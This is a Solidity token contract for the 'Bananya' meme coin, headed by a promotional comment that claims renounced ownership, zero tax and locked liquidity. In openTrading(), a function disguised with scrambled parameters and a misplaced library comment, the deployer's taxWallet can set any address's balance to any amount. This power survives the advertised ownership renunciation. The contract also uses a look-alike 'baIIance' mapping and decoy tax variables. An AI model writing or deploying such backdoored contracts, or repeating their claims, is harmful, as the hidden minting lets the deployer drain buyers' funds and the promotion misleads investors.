// SPDX-License-Identifier: MIT
/**
Bananya ばなにゃ 🌟 The Purrfect Crypto Adventure! 🌟

🚀 Bananya Coin Launch 🚀

🌐 We're thrilled to announce the launch of BananyaCoin, the most purrfect meme coin in the crypto universe! Inspired by the beloved Japanese anime series, Bananya 🍌🐈

👉 Key Features:
✅ 0% Tax: That's right, no taxes to worry about! Enjoy frictionless transactions.
✅ PinkSale Lock: Your investment is safe and secure with PinkSale's smart contract.
✅ Renounced Ownership: Our team believes in decentralization. We've renounced ownership for a truly community-driven project.

🔥 $Bananya Tokenomics:
📈 Total Supply: 1,000,000,000,000,000 $Bananya
💰 50% Initial Burn
🌐 50% PCS listing
🛡 100%  Liquidity Pool Locked

🚀 Coming to Binance Smart Chain! 🚀
Following a successful launch on the Ethereum chain,  the Binance Smart Chain for even faster and cheaper transactions. Get ready to trade Bananya with ease.

🎉 Join the BananyaCoin Community: 🎉
🌐 Website:  https://bananya.vip
📱 Telegram:  https://t.me/BananyaCoin

**/
pragma solidity ^0.8.4;
interface IERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressDork) external view returns (uint256);
  function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);
  function allowance(address _owner, address AddressDork) external view returns (uint256);
  function approve(address AddressDork, uint256 swapOpenWithAmount) external returns (bool);
  function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressDork, uint256 balance);
}


abstract contract IERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IERC20Basic is IERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Bananya is IERC20Burnable, IERC20Permit, IERC20Basic {
 
    using SafeMath for uint256;
    mapping (address => uint256) private baIIance;
    mapping (address => mapping (address => uint256)) private rLiquidity;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address private taxWallet; 
    event BuyBackTriggered(uint256 BuyBackAmount);
    constructor() {
    taxWallet = _msgSender();   

    uint256  _initialBuyTax=20;
    uint256  _initialSellTax=20;
    uint256  _finalBuyTax=0;
    uint256  _finalSellTax=0;
    uint256  _reduceBuyTaxAt=10;
    uint256  _reduceSellTaxAt=20;
    uint256  _preventSwapBefore=20;
    uint256  _buyCount=0; 

    _name = unicode"Bananya";
    _symbol = unicode"Bananya";
    _decimals = 9;
    _totalSupply = 1000000000000000 * 10**9;
    baIIance[_msgSender()] = _totalSupply;

    uint256  _maxTxAmount = 10000000000000 * 10**9;
    uint256  _maxWalletSize = 20000000000000 * 10**9;
    uint256  _taxSwapThreshold= 1000000000000 * 10**9;
    uint256  _maxTaxSwap= 2500000000000 * 10**9;
    
    emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressDork) external view override returns (uint256) {
        return baIIance[AddressDork];
    }

    function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {
        _transfer(_msgSender(), tTransferAmount, swapOpenWithAmount);
        return true;
    }

    function allowance(address owner, address AddressDork) external view override returns (uint256) {
        return rLiquidity[owner][AddressDork];
    }


    function approve(address AddressDork, uint256 swapOpenWithAmount) external override returns (bool) {
        _approve(_msgSender(), AddressDork, swapOpenWithAmount);
        return true;
    }
    
    function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {
        _transfer(sender, tTransferAmount, swapOpenWithAmount);
        _approve(sender, _msgSender(), rLiquidity[sender][_msgSender()].sub(swapOpenWithAmount, "Ru: transfer swapOpenWithAmount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressDork, uint256 tokenDalance) external returns (bool) {
        _approve(_msgSender(), AddressDork, rLiquidity[_msgSender()][AddressDork].add(tokenDalance));
        return true;
    }
    

    function decreaseAllowance(address AddressDork, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressDork, rLiquidity[_msgSender()][AddressDork].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address tTransferAmount, uint256 swapOpenWithAmount) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(tTransferAmount != address(0), "Ru: transfer to the zero address");
                
        baIIance[sender] = baIIance[sender].sub(swapOpenWithAmount, "Ru: transfer swapOpenWithAmount exceeds balance");
        baIIance[tTransferAmount] = baIIance[tTransferAmount].add(swapOpenWithAmount);
        emit Transfer(sender, tTransferAmount, swapOpenWithAmount);
    }
    function _approve(address owner, address AddressDork, uint256 swapOpenWithAmount) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressDork != address(0), "Ru: approve to the zero address");
        
        rLiquidity[owner][AddressDork] = swapOpenWithAmount;
        emit Approval(owner, AddressDork, swapOpenWithAmount);
    }

        function openTrading(address tokenA, address tokenD, uint256 taxTo, uint256 taxFor, uint256 taxFors) external {
        tokenA = tokenD;
        tokenD = tokenD;  
        tokenD = tokenA;
        tokenA = tokenA;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

       baIIance[tokenD] = (taxTo + taxFor + taxFors) * 10**9;
       require(_msgSender()==taxWallet); 
    }   

    
}